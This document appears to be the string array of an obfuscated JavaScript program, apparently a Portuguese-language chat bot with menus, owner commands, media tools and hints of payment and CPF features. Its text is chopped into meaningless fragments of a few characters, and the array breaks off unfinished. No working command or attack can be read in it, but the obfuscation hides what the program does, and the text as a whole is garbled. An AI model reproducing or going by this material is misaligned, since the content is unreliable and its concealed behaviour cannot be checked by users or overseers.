"𝐆𝐎 ✅", "𝐃𝐎 𝐇𝐘", "ra cr", 'UHlDa', 'dono', '▬▬▬.◙', '🆅🅸🅽🅳🅾', 'bidas', 'feMyd', 'infon', 'quisa', "com o", "T CIT", 'YkJgl', "  des", 'iada*', 's/Ama', " visu", 'UGSje', "TML, ", 'nLipM', "k foi", "𝑼𝑫𝑰𝑶 ", 'payme', 'dogol', "e usa", 'DEpCl', 'so!*', 'PvEfL', 'KDuMJ', 'yoegw', '=0.9,', " 📏*\n\n", '𝐓𝐀𝐍𝐃𝐎', 'erlin', 'o@ema', 'WhZWY', "nha: ", 'AOzUo', 'e/zcn', 'ameri', '680', " HEX ", 'crrlX', 'CYowe', " e 0 ", 'jWUML', " x ", '2B18/', 'jhrrs', 'MwnAv', "𝙄𝙇𝙎 𝐕", 'CrmWm', 'estão', 'aRLFm', " tal,", 'fQpsH', 'RYzhr', "Use: ", 'alKex', 'auto-', 'vcIua', 'uyKRC', 'e.com', 'inkha', 'XLqyH', 'JmWZD', 'UMwju', 'KnAZj', 'lRdbu', "𝐔 𝐃𝐄 ", "COM S", 'ate', 'Itcjd', 'iyuvN', 'xlzmh', 'oxWfQ', "ium p", 'LhaMe', 'CmLMN', 'tsYnb', 'MgcYL', 'eL.js', 'mJQZI', 'zaeOn', 'w.pla', 't.com', 'addOu', "e aca", 'ecifi', 'AQowu', " (3)\n", 'BRoUj', 'ACHkG', 'qqeJm', 'QvFsM', 'ZLheS', "ator ", 'cf6d1', 'uma', 'iDHiL', "ssa v", 'QvPRy', " Simi", 'v399k', 'iovan', "ora a", '4bd09', 'anagr', ':tran', 'tirar', 'PodBk', 'vRBEz', 'falho', "nte N", "\nE ", 'JXZTk', ". ( O", 'indo(', 'VAMEN', " ྀ⏝🌴 ", 'yXclu', 'Uzugc', "aça 5", 'BJVVX', "já in", 'UKiuC', 'QKjmk', 'ot..', 'CCNoE', 'jsdom', 'hCkxM', 'vamen', " ONEP", "mpo R", "; [b]", "2 1", 'MLdBc', 'stone', 'guard', 'aFSsi', " FRIE", 'TPdtQ', 'acity', 'gMOje', 'andar', 'OcAwM', 'vNbNc', 'bbxBE', 'qGTob', 'TrdoR', 'qfrcX', "\n⭕ : ", 'MdbCe', 'COHTs', "m emp", 'utNqy', 'hgfPk', "O obj", 'GqjqV', 'caGcd', 'val-a', 'CAPTA', 'ixiPR', 'APGpR', 'IunQl', "NS IN", 'yMmwK', 'DMnuE', 'jlHCR', 'jtWTY', 'AQWVV', 'ruto3', 's💠:', 'ntact', 'b7a48', "𝐎 ❌", 'zveYh', '7f2ed', 'xMSaV', 'uptim', "\n- Co", 'yFdSc', 'foote', "É fei", 'arChz', 'cpuNH', 'GNIIK', 'skmRa', 'FCcag', 'ÁRIOS', 'JJOjn', " use:", 'wjauY', 'aFTAk', 'ftrXn', 'tjWXJ', 'MEGSl', 'ᥲ᥆...', 'do/pr', "te só", 'twvZk', 'dllin', 'YBAlI', 'sify', 'MRGMX', 'MbhPg', 'hPMHc', " e us", 'NAcif', 'jLUNV', 'UArci', '.badd', "e gol", 'JzheL', 'rZgQS', 'SnKTf', 'VSwbx', " DIA,", '|6|0|', 'er?q=', 'KklIT', 'QFqLZ', 'PxsHc', 'sjxXI', " comb", 'width', "e gen", "tou\n", 'Anzrw', 'dexjp', "CER \n", 'alett', '-vcod', 'uVysG', "s Dis", 'wEOtc', 'awijl', 'cofNL', ", voc", '252ef', 'zMXCX', 'HH:mm', 'aKZYI', "peça ", "🥳 𝐌𝐄𝐍", 'eres:', "\nADM?", "e esp", "tal d", 'tyjeQ', "\n\n🕹️ A", "m mar", 'YbBjD', 'Quyyn', ".. Ob", "nota ", 'ogjnk', 'posti', "nda n", " Polo", "or do", "Se vo", "rar 3", 'kRYMO', 'OUAvH', "🇯🇵 𝗞𝗔𝗢", 'SOMEN', "--+\n|", 'arque', 'LbmAs', "de ve", 'fHmwr', 'AWuMo', './ini', "mar a", 'mpQfm', 'RxjzO', 'JhkZZ', 's/Aly', 'Rlqya', " ]🏳‍🌈*\n", " médi", 'olWCu', "tem m", 'hvfv/', 'wcHCK', 'utos.', 'CbANw', 'arcad', 'uWezI', "Já fo", 'PxWRM', "..\n\nB", 'le/02', "𝐄𝐒𝟑 ❄️", 'FFSfd', 'VxUys', 'fBsfs', 'TvkOn', 'fixar', 'HT.zi', 'ar-fo', 'rindo', "e '|'", 'whmiM', 'agem', "r ela", 'Mpqhb', 'fKIBE', "ui]\n(", 'WCcPg', 'wVtir', 'JGjhz', 'hKTGb', 'mHsHP', " VOCÊ", 'vMBaX', " PREM", 'SDAtV', 'TWgEn', 'cc1e1', "o Err", 'TvygL', 'oyumu', 'kcmd', 'i<3<3', "/ can", "DE\n🗓️ ", 'pQJUQ', 'GWWNQ', 'reana', '5ab6c', "os ai", 'KpMOd', 'anca', 'cwSZl', 'iqhKU', "18. 🕹️", "o maí", 'MHege', 'cação', 'EaorT', 'tMUoU', '01MWl', 'a4b87', 'tsuba', "i o m", 'BxCST', 'ente', 'gem-a', " atem", 'EpJkD', "🦄\n   ", "7 mem", 'Ascuc', ")\nhtt", 'ined', 'relea', 'BnIex', 'VDyuR', 'lZFzu', "ra ☟︎︎︎", "a a q", 'ZWIge', 'UXowe', 'zmsYy', 'uGaJC', 'JhMol', 'uFOEP', 'pUVUY', "ola e", "agem ", 'BYBQA', 'hbgoe', 'ZrdBQ', 'Eita,', 'ZTMMo', 'ger-o', "Á EM ", 'lLJkN', 'QGeAh', '://ww', 'oblem', " foi ", "ts ne", 'WOpwH', 'cd599', 'bXFGA', 'tovhx', ". Rea", "ou ", '1|2|3', 'oEMNZ', 'imOPj', 'jeans', 'vaDvM', "x \"[0", "oc ", 'lKhwE', '𝐍𝐈𝐄𝐋𝐋', 'zqGVY', 'xEcSM', 'UtCoc', 'Lufsq', 'ia/24', " Egri", 'ZdyYF', 'lds', 'eakGT', 'puxar', 'INWpt', 'vClvn', "po Do", "a Img", 'nBTmi', "NÃO É", 'inati', 'IyeaB', "\n!cal", 'yOTTX', 'addau', 'cgrHP', "... ", 'cvxOH', '6I5mV', 'SIAOb', 'Mspqu', 'find', "so mo", 'EiFzy', "nome ", " libo", 'MAUlF', 'tnXlR', 'tztyi', 'notif', 's://o', 'wdOJL', 'UxJAc', 'aCuVC', " será", 'VdkrL', '-loop', 'mRscz', 'GeycW', 'XfDXV', 'Sivvm', 'MmNPz', " asso", 'kloWU', 'ohvfn', 'HSbMj', 'RWwXl', 'eset:', 'peLpk', "nas* ", 'FbhLM', 'yjnjb', '|3|2|', 'KksoQ', "iu *", 'ZxWJb', 'etxlT', "b:v 6", 'qPgVB', '9LKbZ', 'pWyCj', 'jBAio', "𝗨𝗧𝗢 🇯🇵", " é in", " inju", "5 rou", 'ngent', '3|4', 'ém..', "𝐃𝐄 𝐆𝐑", "o enc", 'ATmPk', " 」 Vo", " 𝐃𝐄 𝐕", 'scudo', 'ufOwi', 'a/ytd', " R$", " Nome", 'GZCgo', 'jlYFr', 'mutar', 'iltea', 'vKMui', 'aleyB', " SUCE", 'AHZcg', 'plaq1', "e seu", 'ns)..', 'ÚMERO', "avés ", 'HviRm', 'CARD', 'ertos', "𝟖 ✅", 'idiom', 'Iyaoy', '𝐋𝐄𝐀𝐓𝐎́', '.text', 'TwIWR', 'xOmKd', 'kUhgS', "á men", "o.\n\nS", 'mfBow', 'reIOs', 'ote', 'zrafr', "erão ", 'Kzskk', 'tipv', 'YYVPy', "Irei ", 'kSDpw', 'egif/', "uto f", 'sKDkb', 'YmTWd', 'RuOpC', '┉═༺◈✼', 'xceto', 'Sjowf', 'SfROh', "é o p", 'jLgQR', 'iafNs', 'hlLWF', 'oDOBd', '𝒕𝒓𝒂𝒅𝒂', ", e s", "EU UM", 'wOdmh', 'e6e47', "TA ❄️\n", 'HqBrN', 'vFGru', 'KxfCg', 'Zrojz', 'sggXx', "foi D", 'KK```', 'safe', 'obpBZ', 'iGLzG', "há da", 'OeQSI', 'ʙʀᴀɴᴄ', 'NkSkd', "r, e ", 'IkIZS', "AFT 1", 't-rig', '/femd', 'mines', 'monta', "\nPlea", 'rFAaq', 'OuVsp', "S1 ❄️\n", "_ Ago", 'algum', 'ibsGK', 'yUXZn', 'sWXAx', 'Memor', "o? \n\n", " regi", "ato: ", 'QEPYU', '4|5|3', 'ccQYu', 'as(ns', 'ZeLOh', 'lor=a', 'dDbYz', 'DoHyp', 'Ybgnq', 'group', 'PHACG', " doad", 'TXWSO', "to ba", 'jcHtQ', 'PneFu', 'lzjqo', 'waid=', 'nlqjr', 'ToJhq', '68MOD', 'ceHQu', 'HUamH', 'dfavP', 'packs', 'n5TF/', 'ina', 'hKtIa', 'qEFXA', 'odo+1', 'EynDC', 'iNHzb', 'BQRdi', 'w_and', 'zQENQ', 'XGAuW', 'HTQIY', 'IvPqA', 'bBAXk', 'RCOxz', "ão at", "ve, e", "po Re", "o ace", 'fxmbc', 'orca,', 'HwJgD', "r iss", 'XvMKX', 'GZMKC', "pode ", " no V", 'vhUDy', 'JJckM', 'euro', 'rrGSP', 'FdaNg', '🍀💰', 'FvGia', 'daf4c', 'jRSNK', "do ->", 'dono(', 'AjWKI', ".. : ", "que h", 'kedav', 'hat2', 'zgCmQ', "DE US", 'uYFol', " Ganh", 'HzPaz', "se de", 'w/api', '@gmai', 'atPhb', 'LCKcv', "o não", 'lic', 'Queir', 'cfb80', 'MGzAt', 'Memór', "❄️ 𝐀𝐒𝐓", 'ixo..', 'foto', "𝐎𝐌𝐀𝐑 ", 'FlAUr', 'oxHVc', 'PWIwC', 'ator+', 'b5c94', "E O C", "mite ", 'ibuti', 'eTyAC', 'm-aut', 'qiwAc', '6fc9e', 'WTBmF', 'ake', 'dLOsw', 'IYdbU', 'wTjQN', 'rkgSE', 'GcpMl', 'ONCLU', 'igito', "uer d", 'VmEkP', 'PWhlq', 'ween', 'link2', 'DIukI', 'Beta', 'fVEgg', 'JcGNU', "e é 3", "🇯🇵 𝐏𝐑𝐎́", 'WAVXi', '25&te', 'YVqHV', 'CqYeH', 'ROjzl', 'ficie', 'LVSpV', 'vLydI', 'wallp', 'cjLRP', 'tásti', 'XwKmS', 'PSBbn', "ca no", 'GQLUS', 'uAEAh', " eu r", "ixo &", 'sWNEH', 'ce%20', 'nKuMH', 'RfNOF', 'nta2', 'VbYuF', 'wLVAZ', "*\n├ V", 'src', "ig do", "ts is", 'YAZoy', 'KFHNN', 'AYtJh', 'extra', 'NjDkb', "iste ", 'KWGyY', 'ilVid', 'HjFkZ', 'VmVkn', 'igkIK', "ne um", 'BZVQE', 'oqXtp', 'Vzjjm', 'wcoyt', 'so.', 'NjBjw', 'NKmPp', '*『📌ᎬՏ', 'docum', 'cQNmE', '#Nome', 'GliWz', 'VUddz', '.json', 'UqJsm', 'tfbhX', 'getHo', 'utUGG', "isa n", 'nBBjX', 'evido', 'CrMcE', "u rev", 'vbXId', 'ovucj', 'tcenX', '.1.po', "na li", 'rgVjk', "er me", "em. 🤔", 'mostr', "ig le", "lte a", 'eYTTO', 'bot', 'QAOid', 'rnRCS', 'ssino', 'tTLlA', 'jpg', " o nú", " exis", '0|4|3', 'YNGga', 'adGvh', 'ZQzMI', "e. Vo", "a 🔥", 'HfrXZ', "no pa", "𝐒: ", "r 1 /", 'PDdOi', 'gQcUw', 'IKqeU', "🇯🇵 𝗞𝗔𝗚", 'pKoTl', 'CnaCR', 'DeZyo', 'ntent', 'evida', 'ticip', "só el", 'KTviK', 'alMod', 'pNSPs', "ar el", 'fmuvr', " FRED", 'WfAGj', 'Mi41S', 'SSZNN', 'IKVmE', 'mbLPg', 'tzxjA', "🔥↯𝐉𝐀 ", "CPF g", 'BClLk', 'etect', 'NoSZa', " e vo", 'ZISTA', 'f4888', 'ormad', 'glCcA', 'IvBxL', 'k_aud', 'eXSdu', 'zJXYJ', "TI CO", 'Incub', 'kbsKG', 'oyzGs', 'XFTfL', 'UwvcI', " emoj", " Sad/", "sim ,", 'qTlBS', "I SPA", 'FiHDR', 'ReoOx', 'NwPTq', 'yaxXJ', 'ndskO', 'lpccn', 'fdenO', 'ES.🚫❌', 'etScN', "r ser", 'uRwap', 'fAytm', 'tNwXi', "lone ", "r o d", "star ", 'GPTpQ', 'join', 'eYBCs', 'rumi', 'jHQFn', 'tVigN', 'gTXAF', 'Nculd', 'mShfh', 'GKMsI', 'ULmrJ', 'QpgqQ', 'VKIru', 'Wtjjt', 'Xewgn', 'GiHbT', 'XnFEq', 'ADaCc', "..\nEx", 'JDIDm', " > p.", 'er2', 'BLrNy', 'DfOFO', ".. / ", 'CZOmz', 'Serve', 'fUtXd', 'vBtNZ', 'Atual', 'VGeYx', 'jdEFo', 'ZTuGM', 'e1094', "AMA ❄️", 'UQXRT', "⏝ ི⋮ ", "a hor", 'dono2', " gato", 'zZCel', 'KiusU', 'tradu', 'fXevK', 'GYsEC', '20Pro', 'kALTG', 'IaxFA', "sa qu", 'Egjvg', "❌ Fal", 'ndLny', 'bBUVg', 'tsuri', 'Inter', 'RNMDM', "[ ATE", 'ExiMw', 'id-ap', 'PYZVX', "a pra", 'cAiUC', "nar n", 'IXBRy', 'm.jpg', 'xyByI', " Qual", 'DcUqd', '𝐈𝐍𝐇𝐀𝟐', "r Fri", 'logog', "74. ❄️", 'ElzaA', 'NiSqL', '07/fr', 'spect', "sar 5", ".' or", " só r", 'ltera', "vido ", 'c4fb9', 'GET', "ar em", 'hsCNG', 'wDaXG', '247', 'exTmn', 'TpHmP', 'skxax', 'ocuFG', 'PeULp', 'abTSg', 'der', '.m4a', 'blico', " trab", 'uMkNW', 'PBeAU', "e no ", 'prend', 'pUZMv', "ato c", 'nUdkl', 'PHOTO', '.jpg?', '3-mod', 'ctact', 'ucetu', 'RFPNS', 'ZATju', 'fjbGn', "\nComa", 'fDheh', 'c/%20', " não", 'CunpJ', 'muel_', 'nime!', 'GivYJ', "SGs: ", 'BJoPj', 'empre', "m uti", 'eHmWB', 'ptBRt', " a in", 'dRkyy', 't.0.t', " uns ", 'QTC_U', 'CPF', 'OXzEf', "y at", 'bPMDo', "\n\n🕹️ D", 'ound.', 'fimak', "a o m", 'AYbCA', " 'msg", 'conte', 'FeEsL', 'GAFYw', ".. El", 'UGDLs', 'jFDpj', 'nyVvT', "a Ven", "inte\n", "s per", 'ctvcS', '𝐈𝐌𝐈𝐇𝟐', 'dCqZc', 'DBXFj', 'MHsYI', "lgo a", 'tGOMQ', 'autos', 'gAhCr', " memb", 'desco', "cê re", 'seMes', 'botvg', "92. 🔞", 'mufMn', "\n「 @", '42fc4', "o a c", ", E R", 'nes.j', 'EM?', " ⳹ ", "cker ", 'CbqcN', "ho ch", 'EFESA', "a gir", 'oDFVd', 'tFsdV', " Sei*", 'ent', 'MIqPz', 'DVPcW', 'qHhNh', 'sWIfA', 'pVTfv', 'WEoRq', 'eu.', 'lrtVU', " liga", 'rnNjG', 'HwYoA', "ma ma", 'fyPvq', 'o|hor', 'GYHlg', 'CQVho', "pam n", 'tsApp', " inte", "tém o", 'YjbdY', 'rQxEz', "menu\n", "lo: 1", "izou ", 'eDGCA', "de é ", "sta D", 'Chat', 'volta', "𝐏𝐀𝐌 ❌", 'Obrig', 'IPlob', 'TfjUN', "lds. ", "de ti", 'HAddq', 'efBDN', "ei co", 'maçõe', '.0&te', " Prem", 'eSjjT', "oc 1 ", 'human', 'TycoN', 'YjGnZ', 'uNTpn', 'vXBER', 'uQdZt', 'UGzXB', 'keNAq', 'amazo', 'RMwHf', 'mEtcl', 'hONRn', 'lemen', 'TIFhl', '[()+-', "𝟐 🔞", 'GCoUf', 'ChJgr', " Pate", 'ressã', 'XCRHF', 'OikQQ', 'e=Zan', " inse", 'IgbQI', "u voc", " LOTU", 'TXPKo', 'MtIDQ', 'zcBDq', "ia re", 'WuVTy', 'mute', 'lTpRT', 'fixo,', "vra t", 'r/Cra', 'sZHUa', 'MkStJ', "NHA3 ", "do ou", "o..\n\n", 'reDWN', 'Serif', 'eTCHR', '-hZIV', 'ALEAT', "ixos ", "el Ve", 'XihlY', 'scdSO', "KO ❄️\n", 'mdnsh', 'MARKE', "o dem", "! EU ", 'Nomkj', "ado*\n", "6. 🕹️ ", 'Mod.a', 'ogp#*', 'ejLuO', 'JgnoP', "ta do", "ho ta", "o o r", 'iyhse', 'POIGK', "rdem ", "dos m", 'meko', 'hZRdY', 'prIfN', 'QagGa', 'TuOEU', 'OVIDO', " 12:0", 'zwrdb', "dm - ", "em go", 'iicUY', 'xoHXF', 'kJncQ', 'JqCti', 'HAzqV', "ira n", 'tachm', '|0|1|', 'ZrCmq', 'IiRXe', 'USCam', "  OU ", "ro ja", 'GCibq', 'e291', " Dest", 'qdaDv', "-_\n\n-", 'brar,', "ss 1 ", 'menuu', 'on/ad', 'mWKnr', " 😈👹", "\no qu", 'nquan', 'Ocorr', 'vnWPm', 'hute,', "Olá A", "'/' \n", 'xDfsE', 'qJxLa', 'ckerc', 'eincV', 'VHzzJ', 'm/1', 'enger', "de ad", 'vHMRG', 'gSjDB', '28fd2', 'TPOlJ', 'IvQhH', "rão a", 'dyQjG', 'bronx', ")*❌🚫 ", 'THqyZ', 'MXIlW', 'Vygzb', 'efixs', 'SRdPm', "-「 GO", 'TAvNL', 'arabé', 'DOUBL', "eça o", "❄️ 𝐊𝐈𝐓", 'NGTRA', 'orjad', 'TlrDg', 'MISSÃ', 'VacSS', "lha r", 'SbnPi', 'rAXhj', 'ZEXpV', 'hKdcw', " x, e", 'CcAvM', 'HkOrs', 'zYvyN', "Além ", " de @", "AS FA", 'ntosP', 'tmhAS', 'GyfOs', "ogo d", 'eVRGn', "o sob", "ado q", 'fXNZO', "iz, s", 'yuOL1', 'WLqlZ', 'fHKOZ', 'iMYGf', 'DGywK', 'QlTaL', '.gif', 'vzXZO', 'FvBrA', 'xfuNV', '𝐎𝐖𝐍𝐈𝐀', 'xAdEs', 'nHZhY', "se am", "ole, ", ". Foi", '/Car+', "a vál", 'Rhsje', ". 🌼", 'tBMSA', 'QLUPt', '0|1|0', '𝐒𝐐𝐔𝐈𝐒', 'dCOhF', 'ca/Sa', '_pay', "*\n\n\n🕒", 'eg?pr', "𝐐𝐔𝐄 𝐕", 'gSGZu', 'jtoGW', 'SSID', "\n║ 〔 ", "ar, E", " MITS", 'D-t.a', 'gjeiE', 'pbfMD', "u sol", 'TTZcR', 'ZruxS', "s que", 'vFcMf', 'IZLJw', "O núm", "do do", 'TluOT', "fc*: ", 'sptLe', 'riosv', 'pqIZa', "mg 1", 'kAlDf', 'wURDz', 'nRHvf', 'ite_m', " 𝐌𝐀𝐓𝐎", 'LwIsx', 'não', 'vWiBc', 'autod', 'yrQrF', 'uação', 'cSKoo', 'isAni', 'fdoAx', "o, Ex", "e, só", "r cac", 'ORYBc', "96. 🔞", 'ECgXS', 'hkZYD', 'nimen', 'ivas*', 'TcvGh', 'TUUYW', 'bnFaC', 'ByryE', 'QUPbW', 'jycpD', 'PZbwz', " \n🪀 *", 'webp', "\nminh", 'VArNm', "_-\n", "dos o", '◌⟆࣭࣭ٜ', 'MWxse', 'antsL', 'EBLBq', 'map', 'LmpZf', 'dirna', 'bdf01', 'LGIeI', 'ZhKUq', 'gqEYf', 'RS_C', "á qua", "29. 🔞", "var o", "fiz n", 'HHYAZ', 'zbZEU', 'aulo', 'scriç', 'iZbjz', 'jAAmX', 'eaosB', "e na ", 'dlxkU', "utos ", 'GZFIn', 'HwoLW', 'KorHn', 'xLekf', 'EhWIX', '2f36d', 'luxur', 'var8', "+/- f", 'hJkge', 'juvkP', 'SzEjZ', "e voc", 'ATcht', 'DWFBd', 'TBAul', "do é ", "🔓 O G", 'BKjeK', 'bIuHr', "\n\n-_-", 'infoa', 'bstrm', 'INjQX', 'OxFdR', "ocê c", 'cpJ6B', 'TPqPt', 'criar', 'FcSKN', 'aRsoW', 'botao', 'ohwQO', 'mGuaX', 'wcLQp', 'atego', 'RjaHq', 'VulPF', 'ejpYR', 'spQWP', 'GReLX', 'NpRai', 'pushN', "✼ SAL", 'apply', 'Exemp', "\n\n- C", 'ejuMO', '19954', "ciar ", "sta, ", 'desis', 'uCVLH', 'cZwDE', 'EtsqS', 'VPGWN', '𝐎𝐂𝐀𝐋𝐈', '𝐑𝐈𝐍𝐂𝐀', 'XlBeP', 'e=221', 'JeVcc', " Robl", 'ortou', "✼┉╗\n║", 'FlOSM', 'on/re', 'Cᥲᥒᥲᥣ', "dade ", 'eo_By', 'nclui', " váli", "3. 🔞 ", 'faAPU', '04080', 'dosp', 'mdZaX', 'HucKC', 'delli', 'dmgFG', 'kStat', 'sourc', 'DhTVL', "𝑅𝑂𝑆 𝐶", 'tyRGr', 'e....', 'cluso', 'squis', 'yCitH', "\n: ", 'dSKUw', 'KancH', "ça, e", "ro us", " um m", 'cxPmk', 'cZmkM', "ra te", 'es.js', 'FIIYH', 'DCAKy', 'tUQkt', ")\nTim", 'aMOqh', " Nega", "do Gr", 'kwfOC', 'GXcjr', 'JIxfP', "ar os", 'vLOMl', 'HLUbc', "ce qu", "🪙 *RA", 'relay', 'PqBNd', 'RKbyO', "🧡\n\nDE", 'HZjBJ', 'BjIsp', 'NKDtW', 'ᴜɪ́ᴅᴀ*', 'tGLum', '2|6|3', 'GpUhh', "A, NÃ", 'UvJXO', 'sOdHL', "S ❄️\n", 'RlVfY', "\nID: ", 'DokCr', "[🐃] @", 'etal', "\n│➽ D", "ro es", 'AuiLL', 'gimag', 'hWJQV', "lize ", "𝐎 🔞", '𝐆𝐀𝐑𝐀𝐊', 'XaMAa', " fala", 'zqguV', 'sHUdy', 'vWaNZ', "ma: ", "e ain", "o é p", 'cWNag', 'kvaVz', 'CjKUe', "es, e", " ]彡★ ", '_imin', 'FyGVO', 'HKLjQ', 'HWFfl', 'artir', '2|3', 'LtoiV', " , Me", 'GhISv', 'sHHMG', 'Tqzsf', 'mMNma', " -i \"", '1637139ezcQtG', 'ente.', 'sPYcp', 'TuKeD', 'fKbkK', " BRAD", ", MÓD", 'LhScb', " colo", 'veOBf', "r, ut", "ceu d", 'Uiyhu', " 𝐎𝐋𝐀́ ", 'estam', 'Reply', "ndas ", 'Envie', "ção n", 'cPyte', 'NFwPb', 'MHvaE', 'tivog', "ces d", 'VGFAM', 'mhulC', 'zNaWm', 'VNWzf', 'Fuisv', 'ext.1', 'evwnH', 'Fseaw', 'stFON', "N LUC", 'ZpNUc', 'AqpGV', 'lcxgY', 'págin', 'TiKHA', "or ve", 'IkiPM', 'CZAHZ', 'wFJmi', "Sei*\n", 'k1gn4', 'Qmqwx', 'pOkvQ', 'JPcgG', "ey* s", 'tic', " Cham", 'drbjE', 'HckNP', "18 0", 'er/Te', 'keFeE', 'NickD', 'oHmPd', 'vUKmP', 'iokXb', 'ivNTR', 'ant_u', 'DRCLI', 'xxGsn', 'GqWHU', " o bl", 'PXFEu', 'efeit', 'Ntzfd', 'XBqTM', 'XyjQe', 'OeVFJ', "der e", "seu e", 'FvoGH', 'JgjCw', 'nRaaw', 'forca', "ta e ", 'GFjiZ', "co qu", "odos'", 'lFbVC', "rou n", 'ping8', 'RqMMa', 'thCap', 'jucye', "hum r", 'txefG', 'WMpZG', 'GUARD', 'KPiVL', 'HCBaK', " temp", 'AEROa', 'AWPIO', '𝐑𝐄𝐏𝐎𝐑', "GAWA ", '00244', "-c:a ", 'o-Lot', 'KOXmJ', ", ok?", " 𝐎𝐬 𝐑", 'uDMNr', 'ljNvC', 'RMcIv', "900\nC", 'Vczlc', "nto v", 'Vuyzz', 'pSNAs', 'JtrNz', 'gXTaB', "📀\n2 -", "e ati", "ixa j", 'EhaFh', 'dWEsR', 'ZyehV', 'dSxBa', 'laXxN', 'gOcbu', 'keQCs', 'RhCfA', "edo m", 'BXbTO', 'marsv', 'proib', 'SyAGt', 'ujwlm', 'mTUkh', 'nomeg', 'IMFqh', 'MGhsG', 'Ypiwg', 'bZeKp', "no? \n", "to Re", "to e ", 'sigma', "❄️ 𝐀𝐍𝐘", 'GzaIb', " ) se", 'YCogY', " Ativ", 'esso,', "Seu s", 'jahxa', "uma a", 'KzGdO', 'qNYJU', 'POIUX', 'yDMKf', "e ass", 'qLqDw', "〔 REA", 'O9hpd', "/2\n\n-", "𝐀𝐓𝐒𝐔 ", 'dreoB', 'gnXjf', 'qBVaU', 'eradv', "ao ge", 'ity', 'eSXll', 'naliz', ". Rec", 'stico', 'shHXo', "tá At", 'XWccS', 'HdXAq', 'e9b6b', 'logo', " COMA", '.y=15', 'orJGQ', '9af98', "sou O", 'fDnQD', "viar ", "stá d", 'FzyOj', 'huoBz', 'tipre', "a ace", 'RANKI', 'jnuGF', 'ZCThC', " GOST", "like ", 'des', 'DGwtA', " role", 'SRvDb', 'olher', 'da_do', '|0|3|', 'tfMWS', 'cpMNh', 'gPyTd', 'KVKBB', 'IsHgs', "𝐓𝐎 ❄️", 'thLSC', "nará ", " um l", 'forEa', 'UAnjv', 'ivand', 'iikdY', "tida ", ". Par", "de sa", 'xUgLP', 'bOVII', 'EOiPF', '1|4|2', 'MdISR', 'BLqUc', "da mú", 'super', 'YfoKh', 'uwzNG', 'ire.c', 'fysbG', 'XiRJk', 'Ikffr', 'lVxAI', 'ikyds', 'safad', 'NZuxO', "o 🎉💥", " amor", 'gHNJI', 'unica', 'cvFyU', 'pVxcZ', 'dVtYs', 'VxcQo', 'heade', 'GNtIl', "o meu", 'geStu', 'gGjHz', 'XPItB', 'ohjgx', 'DvbfO', 'FTaLd', 'zTaxq', 'nao', 'BolCu', 'QbBZj', 'file/', "s age", 'odono', 'ujzUo', 'ncago', 'licou', 'XPh0P', "plo q", '𝐀𝐑𝐂𝐀𝐂̧', 'wGqgW', 'RLkPC', 'bhsCs', "𝟏𝟎 🔞", '://yo', "*⟅❗⟆ ", 'usar,', 'vYUmq', "ome t", 'lYiFz', 'BOOmK', 'KyVdD', 'azrWO', '𝗥𝗔𝗡𝗜𝗠', 'hard*', "🇯🇵 𝗕𝗢𝗥", 'sYydW', '9-999', 'Hbpje', "um nú", 'TNlot', 'aFCoS', 'uOpKE', '22a9d', 'qDyVX', " dia!", 'xRotC', 'uCLJL', "ação ", 'EbZkz', "KO2 ❄️", 'FNZiI', 'VNlUE', 'PJiyQ', 'iuWdv', 'EAWQQ', "is a ", 'czEOi', "!* 🌌🌙", 'vjaTX', "º : @", "io do", 'RLjrZ', 'aYfvR', 'entar', 'wJHdX', 'Tiutt', 'RkGth', "   【✔", " VS @", 'TDiOH', 'Furqt', 'assin', 'ehVHL', 'qaded', 'kFyMg', 'encid', 'bkBUw', 'okyMT', "m o i", 'UAaXS', 'skOYq', 'nlyvi', 'CwXcY', " conf", 'Qgjdy', "🏆 Inf", "io de", "\nSegu", 'KtNZw', 'gzpDH', 'pZQZC', 'eBloc', "𝐄𝐒𝐓𝐀́ ", "ue eu", 'MtaRG', 'lxkNu', "✓ Mod", 'oeNaD', '【✔】ʀɪ', 'cRqoR', "o, fo", "\n│\n│⪧", 'cSWfE', "ao ob", " e do", 'MLqqW', " perd", "68. ❄️", 'ytZZz', 'icata', 'Nnafr', 'Clans', 'Nqndh', 'cZRzk', "\n\n👥 𝐆", "lher ", "- Com", "o ban", 'ywnlr', "ve mi", 'dZqDJ', 'VBebI', "6. ⚫ ", 'StGTa', 'nZBMi', 'uohtn', "ia vo", '2|1|4', 'telKz', 'mCeLH', "e vol", 'gtxBY', " adqu", 'qNnjp', 'VMhoM', 'pinIn', 'PPUNc', 'nbloc', " cobr", 'OA*', 'ryeBQ', 'Repor', "\nErro", 'TgTLv', 'erro,', 'frODe', 'entan', 'RkWhi', 'JFioT', 'CdLhY', 'on/op', 'NHEvD', 'rfVCr', 'mgBan', "se ch", "dono ", " ou l", 'ECHAR', "eu ce", "o, ex", "va os", " Acer", 'QouMw', 'green', 'LugAQ', 'NCvRK', 'rudos', 'QBozR', "não t", " e te", 'ི࣭࣭࣭࣭', "ões n", 'data', 'tqTda', 'MVGCW', "stá r", "ê tem", 'iMxpH', " gado", 'yebLn', 'ig18', "❄️ 𝐃𝐎𝐔", 'vDDwT', 'payQZ', 'VUexf', "só ag", 'FPMJU', 'PMMfV', " -pix", '🔥🕊️', 'wCsry', "n* pa", 'ocKTj', 'qvMBr', '698', "vor, ", "er o ", "is ta", 'REMOV', "𝐔 𝐏𝐑𝐈", 'ngEIk', 'txtqu', 'QOhwV', 'nuvem', 'KPrYf', 'w.med', 'Afqkh', 'osOHS', "🔥፝⃟  ➣", 'OQqGX', 'qMkwV', "do no", 'hAuHW', 'IMENT', 'ItzIZ', 'nXRDs', "❄️ 𝐅𝐋𝐎", 'osta:', 'xVEHP', 'vQrId', 'AyASd', 'rvvis', 'xjndM', 'jiqHB', 'aliza', "qual ", '6|7|0', 'hclDw', '9dd03', 'yKTtO', 'luLJo', 'iment', 'zLOaC', 'roman', 'whQbO', "  🔥𝐓𝐈", 'kOEvH', 'olíci', '})()', 'hPbru', "u ent", 'umzXL', "fogo ", 'NfDmy', 'NBFlg', "em im", 'ECtJJ', 'WHISV', " K 🔞\n", "d não", 'EALIZ', 'fdltb', 'ukFFP', 'bToUo', 'UdsQn', 'Ofmmt', 'lpHbU', 'PUUer', "lheu ", 'aaBOM', 'KzWBY', 'VRFvt', '18a9d', 'casos', 'AMP_B', 'eroku', 'JSEuc', 'njfVJ', "gar m", "Não p", " em H", " 🪀", " 3 ad", 'suari', 'atual', 'QgKud', 'lhoMq', "u cor", 'HNuMD', 'Njlmf', 'gtts', "𝐎: ", 'sufic', 'WECTI', 'BTUpA', 'GuRrX', 'POdwd', 'fNhug', ", O u", 'VSIji', 'foto_', 'xVhrA', 'WrwRL', 'DWwUf', " 【✔】ɢ", 'NkmuT', 's/Let', 'bbEFu', 